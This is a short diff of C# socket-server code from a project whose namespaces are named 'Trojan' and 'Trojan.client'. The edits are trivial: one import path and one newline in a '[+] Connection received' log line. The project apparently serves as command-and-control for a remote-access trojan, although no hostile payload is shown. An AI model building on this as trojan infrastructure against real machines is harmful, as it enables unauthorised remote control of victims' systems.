@@ -3,7 +3,7 @@ using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using Trojan;
-using Trojan.client;
+using client;
 using Trojan.exceptions;
 
 namespace SocketData.operations
@@ -64,7 +64,7 @@ namespace SocketData.operations
 
                             byte[] buffer = Encoding.UTF8.GetBytes(introduce_message);
 
-                            Console.WriteLine("\n[+] Connection received from :: [{0}] ;", ConnectionManager.connections[ConnectionManager.connections.Count - 1].getRemoteEndPoint());
+                            Console.WriteLine("\r\n[+] Connection received from :: [{0}] ;", ConnectionManager.connections[ConnectionManager.connections.Count - 1].getRemoteEndPoint());
                             await ConnectionManager.connections[ConnectionManager.connections.Count - 1].getConn().SendAsync(buffer, SocketFlags.None);
                         }
                     }
